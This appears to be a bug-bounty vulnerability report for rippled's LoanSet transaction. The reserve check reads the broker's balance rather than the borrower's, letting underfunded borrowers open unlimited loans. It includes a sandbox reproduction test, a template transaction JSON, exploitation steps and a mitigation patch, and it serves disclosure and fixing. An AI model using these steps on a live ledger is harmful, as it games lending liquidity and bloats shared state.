# Title
Insufficient borrower reserve enforcement in LoanSet enables unlimited loan creation (ledger bloat, unfair distribution)

# Description

## Brief/Intro

`LoanSet` submitted by a broker validates the XRP reserve against the broker's balance (`mPriorBalance`), not the borrower's. As a result, broker-originated loans bypass the borrower's reserve requirement while still creating the loan object and transferring principal—enabling unlimited loans and breaking reserve-based anti‑spam economics.

## Vulnerability Details

At `LoanSet::doApply` (`src/xrpld/app/tx/detail/LoanSet.cpp:504-508`), the borrower's `sfOwnerCount` is incremented, then the reserve check compares `mPriorBalance` (the submitting account's pre‑fee XRP) to `accountReserve(ownerCount)`. For broker-originated loans (`sfAccount = broker owner`), `mPriorBalance` refers to the broker—not the borrower—so underfunded borrowers still pass the reserve check and receive loans.

Vulnerable code:
```cpp
adjustOwnerCount(view, borrowerSle, 1, j_);
{
    auto ownerCount = borrowerSle->at(sfOwnerCount);
    if (mPriorBalance < view.fees().accountReserve(ownerCount))
        return tecINSUFFICIENT_RESERVE;
}
```

Per `Transactor::apply` (`src/xrpld/app/tx/detail/Transactor.cpp`), `mPriorBalance` is read from the transaction's `sfAccount` before fees are applied. Because `mPriorBalance` references the broker's XRP balance, the borrower bypasses the reserve check.

A one-line root cause:

- Root cause: The reserve check gates on `mPriorBalance` (transaction account = broker owner) instead of the borrower's XRP balance after incrementing the borrower's `sfOwnerCount`.

A sandbox test (`testLoanSetBrokerReserveBypass` in `src/test/app/Loan_test.cpp:4486-4540`) reproduces this vulnerability:

```cpp
void testLoanSetBrokerReserveBypass()
{
    using namespace jtx;
    using namespace loan;

    testcase("LoanSet borrower reserve bypass when broker submits");

    Account const issuer{"issuer"};
    Account const lender{"lender"};
    Account const borrower{"borrower"};

    Env env(*this, all);
    env.fund(XRP(1'000'000), issuer, lender, borrower);
    env.close();

    PrettyAsset const asset = issuer[iouCurrency];
    env(trust(lender, asset(10'000'000)));
    env(trust(borrower, asset(10'000'000)));
    env.close();
    env(pay(issuer, lender, asset(10'000'000)));
    env.close();

    BrokerInfo broker{createVaultAndBroker(env, asset, lender)};
    Number const principalRequest = asset(1'000).value();

    auto const ownerCountBefore = env.ownerCount(borrower);
    BEAST_EXPECT(ownerCountBefore > 0);

    auto const reserveBeforeDrops =
        env.current()->fees().accountReserve(ownerCountBefore).drops();
    auto const borrowerBalanceDrops =
        env.balance(borrower).xrp().drops();
    auto const burnDrops =
        borrowerBalanceDrops - reserveBeforeDrops;
    BEAST_EXPECT(burnDrops > 0);

    // Drain borrower to exact reserve requirement
    env(pay(borrower, issuer, drops(burnDrops)));
    env.close();
    BEAST_EXPECT(
        env.balance(borrower).xrp().drops() == reserveBeforeDrops);

    // Submit LoanSet from broker (not borrower) - transaction succeeds despite borrower lacking reserve
    env(set(lender, broker.brokerID, principalRequest),
        counterparty(borrower),
        sig(sfCounterpartySignature, borrower),
        fee(env.current()->fees().base * 5),
        ter(tesSUCCESS));  // ✅ Bypass confirmed: transaction succeeds
    env.close();

    // Verify borrower's owner count increased
    BEAST_EXPECT(env.ownerCount(borrower) == ownerCountBefore + 1);
    
    // Verify borrower's balance is still below the new reserve requirement
    auto const reserveAfter =
        env.current()->fees().accountReserve(env.ownerCount(borrower));
    BEAST_EXPECT(
        env.balance(borrower).xrp() < reserveAfter);  // ❌ Reserve bypass confirmed
}
```

The test demonstrates that after broker submission, borrower `sfOwnerCount` increases while their XRP balance remains below `accountReserve(ownerCount)`, confirming the reserve bypass.

### Minimal LoanSet JSON (for reproduction)

```json
{
  "TransactionType": "LoanSet",
  "Account": "<BROKER_OWNER_ACCOUNT>",
  "LoanBrokerID": "<BROKER_ID>",
  "Counterparty": "<BORROWER_ACCOUNT>",
  "CounterpartySignature": {
    "SigningPubKey": "<BORROWER_SIGNING_PUBKEY_HEX>",
    "TxnSignature": "<BORROWER_SIGNATURE_HEX>"
  },
  "PrincipalRequested": {
    "currency": "USD",
    "issuer": "<ISSUER_ACCOUNT>",
    "value": "1000"
  },
  "PaymentInterval": 2419200,
  "PaymentTotal": 12,
  "Fee": "12",
  "Flags": 0
}
```

Notes:
- `Account` must be the broker owner's account (the loan broker submitter).
- `CounterpartySignature` must be produced by the borrower, co‑signing the transaction.

## Impact Details

Underfunded borrowers can accumulate many loan objects without staking XRP per object, enabling:
- Unfair access to lending liquidity
- Evasion of reserve-based spam controls
- Unbounded state growth (ledger bloat)

A colluding broker/borrower pair can repeatedly originate loans while the borrower remains at or below reserve, potentially draining vault liquidity or inflating obligations without intended economic friction.

This manipulation of loan provisioning falls under "Modification of the loan setting resulting in unfair distribution and/or gaming of funds."

### Severity

- **High.** This issue enables unfair distribution/gaming and ledger bloat, but does not directly drain funds from the vault in a single transaction. It aligns with the Attackathon guidance where direct theft is Critical, while economic rule bypass without immediate fund drainage is High.

### Affected Component

- `LoanSet::doApply` in `src/xrpld/app/tx/detail/LoanSet.cpp` (reserve check uses `mPriorBalance`)
- `Transactor::apply` / signature path in `src/xrpld/app/tx/detail/Transactor.cpp` (source of `mPriorBalance`)


## References

- `src/xrpld/app/tx/detail/Transactor.cpp` (`mPriorBalance` source)
- `src/xrpld/app/tx/detail/LoanSet.cpp:504-508` (reserve check)
- `src/test/app/Loan_test.cpp:4486-4540` (`testLoanSetBrokerReserveBypass` sandbox reproduction)

## Recommended Mitigation

After `adjustOwnerCount(view, borrowerSle, 1, j_)`, compute the borrower's available XRP (e.g., via `accountHolds` or by reading `borrowerSle->at(sfBalance)` directly) and compare it to `view.fees().accountReserve(ownerCount)`. The check should gate on the borrower's balance, not `mPriorBalance`.

```cpp
auto const borrowerBalance = accountHolds(
    view,
    borrower,
    xrpAccount(),
    FreezeHandling::fhIGNORE_FREEZE,
    AuthHandling::ahIGNORE_AUTH,
    j_);
if (borrowerBalance.xrp() < view.fees().accountReserve(ownerCount))
    return tecINSUFFICIENT_RESERVE;
```

# Proof of Concept

## Environment Setup

1. Build `rippled` from this repository with lending amendments enabled (per `BUILD.md`).
2. Create accounts for issuer `I`, broker owner `B`, and borrower `U`.
3. Fund accounts with sufficient XRP and IOU liquidity.
4. Create a vault via `VaultCreate` and deposit assets.
5. Configure a loan broker (`LoanBrokerSet`) owned by `B` with adequate cover.

## Exploitation Steps

1. **Reduce borrower's XRP to minimum reserve**
   - Send `borrower`'s excess XRP back to `issuer` until `borrower`'s balance equals `accountReserve(ownerCount)` for their current owner count.

2. **Submit broker-originated LoanSet**
   - Construct a `LoanSet` transaction with:
     - `Account = B` (broker owner)
     - `LoanBrokerID` referencing the broker SLE
     - `Counterparty = U` (borrower)
     - Valid `CounterpartySignature` from `borrower`
     - Positive `PrincipalRequested` and standard loan parameters

3. **Verify transaction succeeds**
   - Submit the transaction; it returns `tesSUCCESS` despite borrower lacking reserve.

4. **Inspect ledger state**
   - `borrower`'s `sfOwnerCount` increased by 1
   - `borrower`'s XRP balance remains unchanged and below `accountReserve(newOwnerCount)`
   - A new loan SLE (`keylet::loan`) exists for the borrower

5. **Repeat to demonstrate bypass**
   - Repeat steps 1-4 to create additional loans while `borrower` maintains only minimal XRP, demonstrating continuous reserve bypass.

## Validation Checklist

The vulnerability is confirmed when:
- ✅ `LoanSet` transaction succeeds with `sfAccount = broker owner`
- ✅ Borrower's `sfOwnerCount` increases
- ✅ Borrower's XRP balance remains below `accountReserve(ownerCount)` after loan creation
- ✅ Loan ledger entry exists for the borrower
- ✅ Process can be repeated to create multiple loans

This demonstrates that brokers can originate loans for borrowers who lack the XRP reserve required for additional owner entries, effectively gaming loan provisioning and consuming vault liquidity without the intended economic cost.

